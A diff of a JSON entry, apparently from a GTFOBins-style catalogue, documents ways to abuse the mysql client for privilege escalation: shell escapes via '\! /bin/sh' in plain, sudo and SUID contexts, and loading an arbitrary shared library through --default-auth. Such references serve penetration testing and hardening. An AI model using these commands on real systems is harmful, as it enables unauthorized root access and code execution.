@@ -1,25 +1,27 @@
 {
-  "description": "A valid MySQL server must be available.",
   "functions": {
     "shell": [
       {
-        "code": "mysql -e '\\! /bin/sh'"
+        "description": "",
+        "code": "mysql -e '\\! /bin/sh'\n"
       }
     ],
     "sudo": [
       {
-        "code": "sudo mysql -e '\\! /bin/sh'"
+        "description": "",
+        "code": "sudo mysql -e '\\! /bin/sh'\n"
       }
     ],
     "limited-suid": [
       {
-        "code": "./mysql -e '\\! /bin/sh'"
+        "description": "",
+        "code": "./mysql -e '\\! /bin/sh'\n"
       }
     ],
     "library-load": [
       {
-        "description": "A MySQL server must accept connections in order for this to work. The following loads the '/path/to/lib.so' shared object.",
-        "code": "mysql --default-auth ../../../../../path/to/lib"
+        "description": "A MySQL server must accept connections in order for this to work.\n\nThe following loads the `/path/to/lib.so` shared object.\n",
+        "code": "mysql --default-auth ../../../../../path/to/lib\n"
       }
     ]
   }
